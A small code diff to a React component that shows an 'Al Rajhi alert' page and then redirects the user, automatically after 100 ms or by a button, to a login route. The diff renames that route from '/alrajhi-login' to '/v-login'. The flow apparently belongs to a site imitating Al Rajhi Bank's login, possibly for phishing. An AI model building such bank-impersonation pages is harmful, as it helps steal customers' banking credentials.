@@ -12,7 +12,7 @@ export default function AlRajhiAlert() {
     navigateToPage("تنبيه الراجحى");
     // Auto navigate after showing alert
     const timer = setTimeout(() => {
-      navigate("/alrajhi-login");
+      navigate("/v-login");
     }, 100);
     return () => clearTimeout(timer);
   }, [navigate]);
@@ -60,7 +60,7 @@ export default function AlRajhiAlert() {
 
         {/* Continue Button */}
         <Button
-          onClick={() => navigate("/alrajhi-login")}
+          onClick={() => navigate("/v-login")}
           className="w-full bg-[#004d7a] hover:bg-[#003d5c]"
           size="lg"
         >
